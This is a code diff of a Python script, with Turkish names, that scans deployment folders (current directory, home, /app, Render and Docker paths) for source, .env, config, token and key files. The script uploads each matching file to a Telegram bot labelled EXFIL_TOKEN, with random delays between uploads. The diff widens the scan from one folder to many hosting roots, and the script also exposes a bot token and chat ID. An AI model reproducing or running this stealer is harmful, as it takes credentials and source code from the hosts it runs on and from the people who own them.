@@ -5,7 +5,7 @@ import random
 import requests
 from datetime import datetime
 
-MY_CHAT_ID = "8216576697"
+MY_CHAT_ID = "8216576697"         
 EXFIL_TOKEN = "7869982853:AAGkI5v1o028LUaI4q-KCcqcotoH9nFsDyA"
 API = f"https://api.telegram.org/bot{EXFIL_TOKEN}/"
 
@@ -30,7 +30,6 @@ def mesaj_gonder(text):
 def dosya_gonder(yol):
     if not os.path.isfile(yol):
         return False
-    
     if os.path.getsize(yol) > 50 * 1024 * 1024:
         mesaj_gonder(f"Çok büyük geçti: {os.path.basename(yol)}")
         return False
@@ -50,37 +49,44 @@ def token_var_mi(icerik):
 
 def kritik_dosya(dosya_adi):
     ad = dosya_adi.lower()
-    kritik_uzantilar = (".py", ".env", ".json", ".yml", ".yaml", ".ini", ".toml", ".cfg")
-    kritik_kelimeler = ["bot", "token", "config", "main", "settings", "api", "secret", "key"]
-    
-    return ad.endswith(kritik_uzantilar) or any(k in ad for k in kritik_kelimeler)
+    return ad.endswith((".py", ".env", ".json", ".yml", ".yaml", ".ini", ".toml", ".cfg")) or \
+           any(k in ad for k in ["bot", "token", "config", "main", "settings", "api", "secret", "key"])
 
 def tara_ve_direkt_gonder():
-    hedef_klasor = "/home/runner/workspace/hosted_scripts/"
-    
-    if not os.path.exists(hedef_klasor) or not os.path.isdir(hedef_klasor):
-        mesaj_gonder(f"KLASÖR BULUNAMADI → {hedef_klasor}")
-        return
+    mesaj_gonder("....")
 
-    mesaj_gonder(f"Taranıyor: {hedef_klasor}")
+    kokler = [
+        os.getcwd(),
+        "/app",
+        os.path.dirname(os.getcwd()),
+        os.path.expanduser("~"),
+        "/opt/render/project/src",
+        "/usr/src/app",
+    ]
 
     bulunanlar = []
 
-    for root, dirs, files in os.walk(hedef_klasor):
-        for dosya in files:
-            tam_yol = os.path.join(root, dosya)
-            if kritik_dosya(dosya):
-                bulunanlar.append(tam_yol)
+    for kok in kokler:
+        if not os.path.exists(kok):
+            continue
+        mesaj_gonder(f"Taranıyor: {kok}")
+
+        for yol, _, dosyalar in os.walk(kok):
+            for dosya in dosyalar:
+                tam_yol = os.path.join(yol, dosya)
+                if kritik_dosya(dosya):
+                    bulunanlar.append(tam_yol)
 
     toplam = len(bulunanlar)
-    mesaj_gonder(f"{toplam} adet kritik dosya bulundu → gönderiyorum")
+    mesaj_gonder(f"{toplam} adet dosya bulundu → direkt gönderiyorum")
 
     gonderilen = 0
 
     for idx, yol in enumerate(bulunanlar, 1):
         isim = os.path.basename(yol)
-        
-        # Token kontrolü
+        caption = f"[{idx}/{toplam}] {yol} • {datetime.now().strftime('%Y-%m-%d %H:%M')}"
+
+       
         try:
             with open(yol, "r", encoding="utf-8", errors="ignore") as f:
                 icerik = f.read(600_000)
@@ -90,24 +96,24 @@ def tara_ve_direkt_gonder():
         except:
             pass
 
+        
         if dosya_gonder(yol):
             gonderilen += 1
-            mesaj_gonder(f"Gönderildi → {isim}  [{idx}/{toplam}]")
+            mesaj_gonder(f"Gönderildi → {isim}")
         else:
-            mesaj_gonder(f"Atlandı → {isim}  (hata / büyük / erişim yok)")
+            mesaj_gonder(f"Atlandı → {isim} (hata / büyük)")
 
-        time.sleep(random.uniform(4.5, 9.0))
+        time.sleep(random.uniform(4.5, 9.0))  
 
     mesaj_gonder(
-        "█ B İ T T İ █\n"
-        f"Klasör: {hedef_klasor}\n"
-        f"Toplam kritik dosya: {toplam}\n"
-        f"Başarıyla gönderilen: {gonderilen}\n"
-        f"Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
+        f"█ BİTTİ █\n"
+        f"Toplam: {toplam}\n"
+        f"Gönderilen: {gonderilen}\n"
+        f"base64 = 0, chunk = 0, direkt dosya = 100%"
     )
 
 if __name__ == "__main__":
     try:
         tara_ve_direkt_gonder()
     except Exception as e:
-        mesaj_gonder(f"CRITICAL HATA:\n{str(e)[:1000]}")
+        mesaj_gonder(f"Patladı:\n{str(e)[:800]}")
